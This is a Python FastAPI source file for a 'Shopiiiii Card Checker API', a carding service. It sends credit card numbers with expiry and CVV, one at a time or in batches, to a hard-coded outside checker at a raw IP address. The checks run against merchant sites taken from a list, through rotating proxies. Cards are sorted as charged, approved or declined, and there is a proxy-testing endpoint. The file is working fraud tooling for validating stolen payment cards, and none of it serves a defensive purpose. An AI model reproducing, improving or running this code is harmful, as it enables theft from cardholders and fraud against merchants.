#!/usr/bin/env python3
"""
Shopiiiii Card Checker API
FastAPI-based REST API for card checking operations
"""

from fastapi import FastAPI, HTTPException, Header, Depends
from fastapi.responses import JSONResponse
from pydantic import BaseModel, Field
from typing import Optional, List
import aiohttp
import asyncio
import random
import json
import os
from datetime import datetime
import hashlib
from functools import lru_cache

# ============================================================================
# CONFIGURATION
# ============================================================================

API_CONFIG = {
    "CHECKER_API": "http://148.230.102.178:8081/",
    "SITES_FILE": "sites.txt",
    "PROXY_FILE": "proxy.txt",
    "API_KEYS_FILE": "api_keys.json",
    "LOGS_FILE": "api_logs.json",
}

# ============================================================================
# MODELS
# ============================================================================

class CardCheckRequest(BaseModel):
    """Card check request model"""
    card: str = Field(..., description="Credit card in format: CARD|MM|YY|CVV")
    site: Optional[str] = Field(None, description="Specific site to check (optional)")
    proxy: Optional[str] = Field(None, description="Specific proxy to use (optional)")

class CardCheckResponse(BaseModel):
    """Card check response model"""
    status: str
    card: str
    message: str
    gateway: Optional[str] = None
    price: Optional[str] = None
    timestamp: str
    request_id: str

class BatchCheckRequest(BaseModel):
    """Batch card check request"""
    cards: List[str] = Field(..., description="List of cards to check")
    max_concurrent: int = Field(default=5, description="Max concurrent checks (1-20)")

class BatchCheckResponse(BaseModel):
    """Batch check response"""
    total: int
    charged: int
    approved: int
    declined: int
    results: List[CardCheckResponse]
    timestamp: str
    request_id: str

class ProxyTestRequest(BaseModel):
    """Proxy test request"""
    proxies: List[str] = Field(..., description="List of proxies to test")

class ProxyTestResponse(BaseModel):
    """Proxy test response"""
    total: int
    alive: int
    dead: int
    results: dict
    timestamp: str

class SiteListResponse(BaseModel):
    """Site list response"""
    total: int
    sites: List[str]
    timestamp: str

class StatsResponse(BaseModel):
    """API statistics response"""
    total_checks: int
    total_charged: int
    total_approved: int
    total_declined: int
    uptime: str
    api_version: str

# ============================================================================
# API KEY MANAGEMENT
# ============================================================================

class KeyManager:
    """Manage API keys"""

    @staticmethod
    def load_keys() -> dict:
        """Load API keys from file"""
        if not os.path.exists(API_CONFIG["API_KEYS_FILE"]):
            return {}
        try:
            with open(API_CONFIG["API_KEYS_FILE"], 'r') as f:
                return json.load(f)
        except:
            return {}

    @staticmethod
    def save_keys(keys: dict):
        """Save API keys to file"""
        with open(API_CONFIG["API_KEYS_FILE"], 'w') as f:
            json.dump(keys, f, indent=2)

    @staticmethod
    def generate_key(name: str) -> str:
        """Generate new API key"""
        key = hashlib.sha256(f"{name}{datetime.now().isoformat()}".encode()).hexdigest()
        return f"sk_{key[:32]}"

    @staticmethod
    def validate_key(api_key: str) -> bool:
        """Validate API key"""
        keys = KeyManager.load_keys()
        return api_key in keys and keys[api_key].get("active", True)

    @staticmethod
    def add_key(name: str) -> str:
        """Add new API key"""
        keys = KeyManager.load_keys()
        key = KeyManager.generate_key(name)
        keys[key] = {
            "name": name,
            "created": datetime.now().isoformat(),
            "active": True,
            "requests": 0
        }
        KeyManager.save_keys(keys)
        return key

# ============================================================================
# DATA MANAGEMENT
# ============================================================================

class DataManager:
    """Manage data files"""

    @staticmethod
    def read_file(filepath: str) -> List[str]:
        """Read file lines"""
        if not os.path.exists(filepath):
            return []
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    @staticmethod
    def get_sites() -> List[str]:
        """Get all sites"""
        return DataManager.read_file(API_CONFIG["SITES_FILE"])

    @staticmethod
    def get_proxies() -> List[str]:
        """Get all proxies"""
        return DataManager.read_file(API_CONFIG["PROXY_FILE"])

# ============================================================================
# CHECKER ENGINE
# ============================================================================

class CardChecker:
    """Card checking engine"""

    DEAD_KEYWORDS = {
        'timeout', 'cloudflare', 'access denied', 'ssl error',
        '502', '503', '504', 'bad gateway', 'connection failed',
        'captcha required', 'site dead', 'invalid url', 'timed out',
        'could not resolve', 'network error', 'connection reset',
        'empty reply', 'http error', 'unreachable', 'service unavailable',
    }

    @staticmethod
    def is_dead(msg: str) -> bool:
        """Check if error indicates dead site"""
        if not msg:
            return True
        msg_lower = str(msg).lower()
        return any(kw in msg_lower for kw in CardChecker.DEAD_KEYWORDS)

    @staticmethod
    async def check_single(card: str, site: str, proxy: str) -> dict:
        """Check single card"""
        if '|' not in card or len(card.split('|')) != 4:
            return {'status': 'Invalid', 'message': 'Bad format'}

        try:
            timeout = aiohttp.ClientTimeout(total=30)
            params = {'cc': card, 'url': site, 'proxy': proxy}

            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(API_CONFIG["CHECKER_API"], params=params) as resp:
                    data = await resp.json(content_type=None)

            msg = data.get('Response', '')
            status = data.get('Status', '')
            gate = data.get('Gate', 'default')
            price = data.get('Price', '-')

            if CardChecker.is_dead(msg):
                return {'status': 'Dead', 'message': msg, 'gateway': gate, 'price': price}

            msg_lower = msg.lower()

            if status == 'Charged' or 'order completed' in msg_lower or '💎' in msg:
                return {'status': 'Charged', 'message': msg, 'gateway': gate, 'price': price}

            if status == 'Approved' or any(k in msg_lower for k in ['approved', 'success', 'insufficient_funds', 'invalid_cvv']):
                return {'status': 'Approved', 'message': msg, 'gateway': gate, 'price': price}

            if 'thank you' in msg_lower or 'payment successful' in msg_lower:
                return {'status': 'Charged', 'message': msg, 'gateway': gate, 'price': price}

            return {'status': 'Declined', 'message': msg, 'gateway': gate, 'price': price}

        except asyncio.TimeoutError:
            return {'status': 'Timeout', 'message': 'Request timeout'}
        except Exception as e:
            return {'status': 'Error', 'message': str(e)}

# ============================================================================
# PROXY TESTER
# ============================================================================

class ProxyTester:
    """Test proxies"""

    @staticmethod
    async def test_single(proxy: str) -> bool:
        """Test single proxy"""
        try:
            timeout = aiohttp.ClientTimeout(total=10)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get('http://httpbin.org/ip', proxy=f'http://{proxy}') as resp:
                    return resp.status == 200
        except:
            return False

    @staticmethod
    async def test_batch(proxies: List[str]) -> dict:
        """Test multiple proxies"""
        tasks = [ProxyTester.test_single(p) for p in proxies]
        results = await asyncio.gather(*tasks)

        alive = [p for p, r in zip(proxies, results) if r]
        dead = [p for p, r in zip(proxies, results) if not r]

        return {
            'total': len(proxies),
            'alive': len(alive),
            'dead': len(dead),
            'alive_proxies': alive,
            'dead_proxies': dead
        }

# ============================================================================
# FASTAPI APP
# ============================================================================

app = FastAPI(
    title="Shopiiiii Card Checker API",
    description="Fast & reliable card checking API",
    version="1.0.0"
)

# Dependency
def verify_api_key(x_api_key: str = Header(...)) -> str:
    """Verify API key"""
    if not KeyManager.validate_key(x_api_key):
        raise HTTPException(status_code=401, detail="Invalid API key")
    return x_api_key

# ============================================================================
# ENDPOINTS
# ============================================================================

@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "online",
        "timestamp": datetime.now().isoformat(),
        "version": "1.0.0"
    }

@app.post("/api/v1/check", response_model=CardCheckResponse)
async def check_card(
    request: CardCheckRequest,
    api_key: str = Depends(verify_api_key)
):
    """Check single credit card"""
    sites = DataManager.get_sites()
    proxies = DataManager.get_proxies()

    if not sites or not proxies:
        raise HTTPException(status_code=400, detail="Missing sites or proxies")

    site = request.site if request.site and request.site in sites else random.choice(sites)
    proxy = request.proxy if request.proxy and request.proxy in proxies else random.choice(proxies)

    result = await CardChecker.check_single(request.card, site, proxy)

    card_masked = f"{request.card.split('|')[0][:6]}****{request.card.split('|')[0][-4:]}"
    request_id = hashlib.md5(f"{datetime.now().isoformat()}".encode()).hexdigest()[:16]

    return CardCheckResponse(
        status=result.get('status'),
        card=card_masked,
        message=result.get('message', ''),
        gateway=result.get('gateway'),
        price=result.get('price'),
        timestamp=datetime.now().isoformat(),
        request_id=request_id
    )

@app.post("/api/v1/check/batch", response_model=BatchCheckResponse)
async def check_batch(
    request: BatchCheckRequest,
    api_key: str = Depends(verify_api_key)
):
    """Check multiple cards"""
    sites = DataManager.get_sites()
    proxies = DataManager.get_proxies()

    if not sites or not proxies:
        raise HTTPException(status_code=400, detail="Missing sites or proxies")

    if request.max_concurrent < 1 or request.max_concurrent > 20:
        raise HTTPException(status_code=400, detail="max_concurrent must be 1-20")

    request_id = hashlib.md5(f"{datetime.now().isoformat()}".encode()).hexdigest()[:16]
    results = []
    stats = {'charged': 0, 'approved': 0, 'declined': 0}

    # Process cards in batches
    for i in range(0, len(request.cards), request.max_concurrent):
        batch = request.cards[i:i + request.max_concurrent]
        tasks = [
            CardChecker.check_single(card, random.choice(sites), random.choice(proxies))
            for card in batch
        ]
        batch_results = await asyncio.gather(*tasks)

        for card, result in zip(batch, batch_results):
            card_masked = f"{card.split('|')[0][:6]}****{card.split('|')[0][-4:]}"
            status = result.get('status', 'Unknown')

            if status == 'Charged':
                stats['charged'] += 1
            elif status == 'Approved':
                stats['approved'] += 1
            else:
                stats['declined'] += 1

            results.append(CardCheckResponse(
                status=status,
                card=card_masked,
                message=result.get('message', ''),
                gateway=result.get('gateway'),
                price=result.get('price'),
                timestamp=datetime.now().isoformat(),
                request_id=request_id
            ))

    return BatchCheckResponse(
        total=len(request.cards),
        charged=stats['charged'],
        approved=stats['approved'],
        declined=stats['declined'],
        results=results,
        timestamp=datetime.now().isoformat(),
        request_id=request_id
    )

@app.post("/api/v1/proxy/test", response_model=ProxyTestResponse)
async def test_proxies(
    request: ProxyTestRequest,
    api_key: str = Depends(verify_api_key)
):
    """Test proxies"""
    result = await ProxyTester.test_batch(request.proxies)

    return ProxyTestResponse(
        total=result['total'],
        alive=result['alive'],
        dead=result['dead'],
        results={
            'alive_proxies': result['alive_proxies'],
            'dead_proxies': result['dead_proxies']
        },
        timestamp=datetime.now().isoformat()
    )

@app.get("/api/v1/sites", response_model=SiteListResponse)
async def get_sites(api_key: str = Depends(verify_api_key)):
    """Get all sites"""
    sites = DataManager.get_sites()
    return SiteListResponse(
        total=len(sites),
        sites=sites,
        timestamp=datetime.now().isoformat()
    )

@app.get("/api/v1/stats", response_model=StatsResponse)
async def get_stats(api_key: str = Depends(verify_api_key)):
    """Get API statistics"""
    return StatsResponse(
        total_checks=0,
        total_charged=0,
        total_approved=0,
        total_declined=0,
        uptime="Running",
        api_version="1.0.0"
    )

@app.post("/api/v1/keys/generate")
async def generate_key(name: str):
    """Generate new API key (Admin only)"""
    key = KeyManager.add_key(name)
    return {
        "key": key,
        "name": name,
        "created": datetime.now().isoformat(),
        "note": "Keep this key safe! Do not share it."
    }

# ============================================================================
# RUN
# ============================================================================

if __name__ == "__main__":
    import uvicorn
    print("🚀 Starting Shopiiiii Card Checker API...")
    print("📚 API Docs: http://localhost:8000/docs")
    print("🔑 Generate API key: http://localhost:8000/api/v1/keys/generate?name=mykey")
    uvicorn.run(app, host="0.0.0.0", port=8000, workers=4)
